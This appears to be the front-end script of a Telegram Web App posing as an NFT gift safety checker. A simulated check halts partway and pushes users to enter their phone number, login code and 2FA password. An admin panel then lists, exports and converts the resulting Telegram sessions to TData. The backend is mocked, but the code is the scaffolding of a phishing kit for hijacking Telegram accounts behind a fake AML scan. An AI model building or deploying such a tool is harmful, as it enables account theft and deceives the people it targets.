// Telegram Web App инициализация
let tg = window.Telegram.WebApp;

// Инициализация приложения
document.addEventListener('DOMContentLoaded', function() {
    // Инициализируем Telegram Web App
    tg.expand();
    tg.enableClosingConfirmation();
    
    // Получаем информацию о пользователе
    const user = tg.initDataUnsafe?.user;
    if (user) {
        const username = user.username ? `@${user.username}` : 'Пользователь';
        document.getElementById('username').textContent = username;
        
        // Показываем кнопку админа для админов
        if (user.id == 8584967108) {
            document.getElementById('adminBtn').style.display = 'block';
            document.getElementById('bottomAdminBtn').style.display = 'flex';
        }
    }
    
    // Инициализация полей ввода кода
    initCodeInput();
    
    // Загружаем статистику
    loadStats();
});

// Переключение экранов
function showScreen(screenId) {
    // Скрываем все экраны
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    
    // Показываем нужный экран
    document.getElementById(screenId).classList.add('active');
    
    // Обновляем активную кнопку навигации
    updateNavButtons(screenId);
    
    // Прокручиваем вверх
    window.scrollTo(0, 0);
}

// Обновление кнопок навигации
function updateNavButtons(activeScreen) {
    const navButtons = document.querySelectorAll('.nav-btn');
    navButtons.forEach(btn => btn.classList.remove('active'));
    
    const screenToNavMap = {
        'mainScreen': 0,
        'checkScreen': 1,
        'historyScreen': 2,
        'adminScreen': 3
    };
    
    if (screenToNavMap[activeScreen] !== undefined) {
        navButtons[screenToNavMap[activeScreen]].classList.add('active');
    }
}

// Инициализация ввода кода
function initCodeInput() {
    const codeInputs = document.querySelectorAll('.code-digit');
    
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            if (this.value.length === 1) {
                if (index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                if (index > 0) {
                    codeInputs[index - 1].focus();
                }
            }
        });
    });
}

// Запуск проверки NFT
function startNFTCheck() {
    const nftUrl = document.getElementById('nftUrl').value.trim();
    
    if (!nftUrl) {
        showMessage('Ошибка', 'Пожалуйста, введите ссылку на NFT подарок');
        return;
    }
    
    // Показываем экран проверки
    showScreen('checkingScreen');
    
    // Запускаем симуляцию проверки
    simulateNFTCheck();
}

// Симуляция проверки NFT
function simulateNFTCheck() {
    let progress = 0;
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const step1Status = document.getElementById('step1Status');
    const step2Status = document.getElementById('step2Status');
    const step3Status = document.getElementById('step3Status');
    const loadingMessage = document.getElementById('loadingMessage');
    
    const messages = [
        "Анализируем AML данные...",
        "Проверяем историю транзакций...",
        "Анализируем риск рефаунда...",
        "Изучаем историю владения...",
        "Формируем отчет..."
    ];
    
    const checkInterval = setInterval(() => {
        progress += 2;
        
        if (progress <= 100) {
            progressFill.style.width = `${progress}%`;
            progressText.textContent = `${progress}%`;
            
            // Обновляем сообщение
            if (progress % 20 === 0) {
                const messageIndex = Math.floor(progress / 20) - 1;
                if (messageIndex >= 0 && messageIndex < messages.length) {
                    loadingMessage.textContent = messages[messageIndex];
                }
            }
            
            // Обновляем шаги
            if (progress >= 20) {
                document.querySelectorAll('.step')[0].classList.add('active');
                step1Status.textContent = "Завершено";
            }
            if (progress >= 40) {
                document.querySelectorAll('.step')[1].classList.add('active');
                step2Status.textContent = "Завершено";
            }
            if (progress >= 60) {
                document.querySelectorAll('.step')[2].classList.add('active');
                step3Status.textContent = "Завершено";
            }
        }
        
        // Когда проверка достигнет 50%, показываем экран регистрации
        if (progress >= 50) {
            clearInterval(checkInterval);
            setTimeout(() => {
                showScreen('registrationScreen');
            }, 1000);
        }
    }, 100);
}

// Обработка регистрации
function processRegistration() {
    const regBtn = document.getElementById('regBtn');
    const phoneNumber = document.getElementById('phoneNumber').value.trim();
    const codeGroup = document.getElementById('codeGroup');
    const passwordGroup = document.getElementById('passwordGroup');
    
    if (regBtn.innerHTML.includes('Отправить код')) {
        // Шаг 1: Отправка номера телефона
        if (!phoneNumber) {
            showMessage('Ошибка', 'Пожалуйста, введите номер телефона');
            return;
        }
        
        // Имитация отправки кода
        regBtn.innerHTML = '<i class="fas fa-check"></i> Подтвердить код';
        codeGroup.style.display = 'block';
        showMessage('Код отправлен', 'На указанный номер телефона отправлен код подтверждения');
        
    } else if (regBtn.innerHTML.includes('Подтвердить код')) {
        // Шаг 2: Проверка кода
        const code = getCode();
        
        if (code.length !== 5) {
            showMessage('Ошибка', 'Пожалуйста, введите все 5 цифр кода');
            return;
        }
        
        // Имитация проверки кода
        if (code === '54321') { // Демо-код для 2FA
            regBtn.innerHTML = '<i class="fas fa-lock"></i> Войти с паролем 2FA';
            passwordGroup.style.display = 'block';
            showMessage('Требуется 2FA', 'Введите пароль двухфакторной аутентификации');
        } else {
            // Успешная регистрация
            completeRegistration();
        }
        
    } else if (regBtn.innerHTML.includes('Войти с паролем 2FA')) {
        // Шаг 3: Проверка пароля 2FA
        const password = document.getElementById('password2fa').value;
        
        if (!password) {
            showMessage('Ошибка', 'Пожалуйста, введите пароль 2FA');
            return;
        }
        
        // Успешная регистрация с 2FA
        completeRegistration();
    }
}

// Получение введенного кода
function getCode() {
    let code = '';
    for (let i = 1; i <= 5; i++) {
        code += document.getElementById(`codeDigit${i}`).value || '';
    }
    return code;
}

// Завершение регистрации
function completeRegistration() {
    // Имитация успешной регистрации
    showMessage('Успех', 'Регистрация завершена! Создана Telegram сессия.');
    
    // Обновляем результаты проверки
    document.getElementById('amlResult').textContent = 'Чистый';
    document.getElementById('refundResult').textContent = 'Низкий';
    document.getElementById('historyResult').textContent = 'Прозрачная';
    document.getElementById('verdictText').textContent = 'Безопасно 🟢';
    
    // Генерируем демо сессию
    const sessionCode = '1BVtsOHMBu4P8T8bT7vG3K5Jx...demo...session...string';
    document.getElementById('sessionCode').textContent = sessionCode;
    document.getElementById('sessionInfo').style.display = 'block';
    
    // Показываем экран результатов
    setTimeout(() => {
        showScreen('resultScreen');
    }, 1500);
}

// Повторная отправка кода
function resendCode() {
    const resendBtn = document.getElementById('resendBtn');
    resendBtn.disabled = true;
    resendBtn.innerHTML = '<i class="fas fa-clock"></i> Отправка...';
    
    setTimeout(() => {
        resendBtn.disabled = false;
        resendBtn.innerHTML = '<i class="fas fa-redo"></i> Отправить код повторно';
        showMessage('Код отправлен', 'Новый код подтверждения отправлен на ваш телефон');
    }, 2000);
}

// Копирование кода сессии
function copySessionCode() {
    const sessionCode = document.getElementById('sessionCode').textContent;
    navigator.clipboard.writeText(sessionCode).then(() => {
        showMessage('Скопировано', 'Код сессии скопирован в буфер обмена');
    });
}

// Загрузка статистики
function loadStats() {
    // Демо-статистика
    document.getElementById('totalChecks').textContent = '1,847';
    document.getElementById('safeNFTs').textContent = '97%';
    
    // Для админ панели
    loadAdminStats();
}

// Загрузка админ статистики
async function loadAdminStats() {
    try {
        // В реальном приложении здесь был бы fetch запрос к API
        // Для демо используем mock данные
        const mockStats = {
            totalRegistrations: 1247,
            totalSessions: 893,
            todayRegistrations: 23
        };
        
        document.getElementById('adminTotalReg').textContent = mockStats.totalRegistrations;
        document.getElementById('adminTotalSessions').textContent = mockStats.totalSessions;
        document.getElementById('adminTodayReg').textContent = mockStats.todayRegistrations;
        
        // Загрузка списка сессий
        loadSessionsList();
        
    } catch (error) {
        console.error('Ошибка загрузки статистики:', error);
    }
}

// Загрузка списка сессий
function loadSessionsList() {
    const sessionsList = document.getElementById('sessionsList');
    
    // Mock данные
    const mockSessions = [
        { username: 'user1', user_id: 123456, registration_date: '2024-01-10T14:30:00' },
        { username: 'john_doe', user_id: 789012, registration_date: '2024-01-09T11:20:00' },
        { username: 'nft_lover', user_id: 345678, registration_date: '2024-01-08T09:15:00' }
    ];
    
    if (mockSessions.length === 0) {
        sessionsList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-database"></i>
                <p>Нет данных о сессиях</p>
            </div>
        `;
        return;
    }
    
    sessionsList.innerHTML = '';
    
    mockSessions.forEach(session => {
        const date = new Date(session.registration_date).toLocaleDateString('ru-RU');
        const sessionElement = document.createElement('div');
        sessionElement.className = 'history-item glass';
        sessionElement.innerHTML = `
            <div class="history-date">${date}</div>
            <div class="history-url">@${session.username} (ID: ${session.user_id})</div>
            <div class="history-status success">Активна</div>
        `;
        sessionsList.appendChild(sessionElement);
    });
}

// Конвертация в TData
async function convertToTData() {
    const sessionInput = document.getElementById('sessionInput').value.trim();
    
    if (!sessionInput) {
        showMessage('Ошибка', 'Пожалуйста, введите строку сессии');
        return;
    }
    
    try {
        // В реальном приложении здесь был бы fetch запрос к API
        // Для демо просто показываем сообщение
        showMessage('Конвертация', 'Конвертация начата. Это может занять несколько секунд...');
        
        // Имитация загрузки
        setTimeout(() => {
            showMessage('Успех', 'Конвертация завершена! Файл tdata.zip будет скачан автоматически.');
            
            // Создаем демо-ссылку для скачивания
            const link = document.createElement('a');
            link.href = '#';
            link.download = 'tdata_demo.zip';
            link.click();
            
        }, 2000);
        
    } catch (error) {
        console.error('Ошибка конвертации:', error);
        showMessage('Ошибка', 'Не удалось конвертировать сессию');
    }
}

// Экспорт всех сессий
async function loadSessions() {
    try {
        // В реальном приложении здесь был бы fetch запрос к API
        showMessage('Экспорт', 'Подготовка архива со всеми сессиями...');
        
        setTimeout(() => {
            showMessage('Успех', 'Архив all_sessions.json будет скачан автоматически.');
            
            // Создаем демо-ссылку для скачивания
            const link = document.createElement('a');
            link.href = '#';
            link.download = 'all_sessions_demo.json';
            link.click();
            
        }, 1500);
        
    } catch (error) {
        console.error('Ошибка экспорта:', error);
        showMessage('Ошибка', 'Не удалось экспортировать сессии');
    }
}

// Открытие поддержки в Telegram
function openTelegramSupport() {
    tg.openTelegramLink('https://t.me/aml_checker_support');
}

// Показать модальное окно
function showMessage(title, message) {
    document.getElementById('modalTitle').textContent = title;
    document.getElementById('modalMessage').textContent = message;
    document.getElementById('messageModal').classList.add('active');
}

// Закрыть модальное окно
function closeModal() {
    document.getElementById('messageModal').classList.remove('active');
}

// Обработка клавиши ESC для закрытия модального окна
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        closeModal();
    }
});

// Закрытие модального окна при клике вне его
document.getElementById('messageModal').addEventListener('click', function(e) {
    if (e.target === this) {
        closeModal();
    }
});

// Telegram Web App кнопка "Назад"
tg.onEvent('backButtonClicked', function() {
    const activeScreen = document.querySelector('.screen.active').id;
    
    if (activeScreen === 'mainScreen') {
        tg.close();
    } else {
        showScreen('mainScreen');
    }
});

// Показать кнопку "Назад" на всех экранах кроме главного
function toggleBackButton(show) {
    if (show) {
        tg.BackButton.show();
    } else {
        tg.BackButton.hide();
    }
}

// Обновляем кнопку "Назад" при смене экрана
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.attributeName === 'class') {
            const activeScreen = document.querySelector('.screen.active').id;
            toggleBackButton(activeScreen !== 'mainScreen');
        }
    });
});

observer.observe(document.querySelector('.content'), {
    attributes: true,
    subtree: true,
    attributeFilter: ['class']
});